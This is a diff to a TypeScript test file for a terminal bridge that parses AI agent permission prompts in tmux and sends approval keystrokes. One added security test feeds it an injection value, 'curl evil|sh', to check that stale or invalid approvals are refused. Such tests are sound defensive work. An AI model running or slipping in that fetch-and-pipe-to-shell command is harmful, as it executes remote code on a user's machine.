@@ -91,7 +91,32 @@ describe('TerminalBridge TUI parsers & strict TTY isolation (M1 & M6)', () => {
       { id: 'tty_key:3', name: '3. Deny', kind: 'reject_once' },
     ])
 
-    // 5. Normal Markdown numbered list in assistant answer MUST NOT false-trigger!
+    // 5. Subagent parallel queue badge (`1 of 1` -> `1 of 3`) keeps stable `requestId` so tapping never races
+    const queue1 = [
+      '────────────────────────────────────────────────────────────────────────────────',
+      ' Bash command                                                             1 of 1',
+      ' Run shell command',
+      ' │ python3 check_pods.py',
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+    ]
+    const queue3 = [
+      '────────────────────────────────────────────────────────────────────────────────',
+      ' Bash command                                                             1 of 3',
+      ' Run shell command',
+      ' │ python3 check_pods.py',
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+    ]
+    const pq1 = parseTerminalPermissionPrompt('sess-q', queue1)
+    const pq3 = parseTerminalPermissionPrompt('sess-q', queue3)
+    expect(pq1?.requestId).toBeDefined()
+    expect(pq1?.requestId).toBe(pq3?.requestId)
+    expect(pq3?.title).toContain('Bash command · 1 of 3 · Run shell command')
+
+    // 6. Normal Markdown numbered list in assistant answer MUST NOT false-trigger!
     const normalProseScreen = [
       '接下来可以直接这样试：',
       '  1. 验证跨窗口监控：在其中一个 Claude 里发个小任务',
@@ -132,7 +157,8 @@ describe('TerminalBridge TUI parsers & strict TTY isolation (M1 & M6)', () => {
           return 'p2001\nfcwd\nn/tmp/demo-agy-repo\n'
         }
         if (bin === '/usr/local/bin/tmux' && args.includes('capture-pane')) {
-          if (promptDismissedOnFirstKey) return '✻ Running… (2s)\n'
+          const digitSent = sentCommands.some(c => c.args.includes('send-keys'))
+          if (promptDismissedOnFirstKey && digitSent) return '✻ Running… (2s)\n'
           return [
             '───',
             ' Bash command',
@@ -202,6 +228,7 @@ describe('TerminalBridge TUI parsers & strict TTY isolation (M1 & M6)', () => {
         claudeRuntime: { pid: 1001, sessionId: 'claude-sess-1', cwd: '/tmp' },
       },
       'tty_key:1',
+      okClaude!.pendingPermission!.requestId,
     )
     expect(sent).toBe(true)
     const tmuxSends = sentCommands.filter(c => c.bin.endsWith('tmux') && c.args.includes('send-keys'))
@@ -217,9 +244,29 @@ describe('TerminalBridge TUI parsers & strict TTY isolation (M1 & M6)', () => {
         claudeRuntime: { pid: 1001, sessionId: 'claude-sess-1', cwd: '/tmp' },
       },
       'tty_key:1',
+      okClaude!.pendingPermission!.requestId,
     )
     const tmuxSendsAfter = sentCommands.filter(c => c.bin.endsWith('tmux') && c.args.includes('send-keys'))
     expect(tmuxSendsAfter.map(c => c.args.at(-1))).toEqual(['1'])
+
+    // SECURITY: stale / mismatched approvals and non-option keystrokes are refused, nothing is typed
+    promptDismissedOnFirstKey = false
+    const claudeParams = {
+      nativeId: 'claude-sess-1',
+      engineId: 'claude',
+      claudeRuntime: { pid: 1001, sessionId: 'claude-sess-1', cwd: '/tmp' },
+    }
+    sentCommands.length = 0
+    await expect(bridge.sendPermissionKeystroke(claudeParams, 'tty_key:1', 'tty_perm_stale00000')).rejects.toThrow(
+      /审批内容已变化/,
+    )
+    await expect(
+      bridge.sendPermissionKeystroke(claudeParams, 'tty_key:!curl evil|sh', okClaude!.pendingPermission!.requestId),
+    ).rejects.toThrow(/无效的审批选项/)
+    await expect(
+      bridge.sendPermissionKeystroke(claudeParams, 'tty_key:7', okClaude!.pendingPermission!.requestId),
+    ).rejects.toThrow(/无效的审批选项/)
+    expect(sentCommands.filter(c => c.args.includes('send-keys'))).toHaveLength(0)
   })
 
   it('[T1.6] bridges launchd TMPDIR + C-locale mismatch via tmux -u -S socket paths and identifies IDE hostAppHint', async () => {
@@ -292,6 +339,7 @@ describe('TerminalBridge TUI parsers & strict TTY isolation (M1 & M6)', () => {
         claudeRuntime: { pid: 21674, sessionId: 'becc7366-c7d2-4eb0-8f2e-2034d876007a', cwd: '/tmp' },
       },
       'tty_key:1',
+      okTmux!.pendingPermission!.requestId,
     )
     expect(delivered).toBe(true)
     const sendCalls = sentCommands.filter(c => c.bin.endsWith('tmux') && c.args.includes('send-keys'))
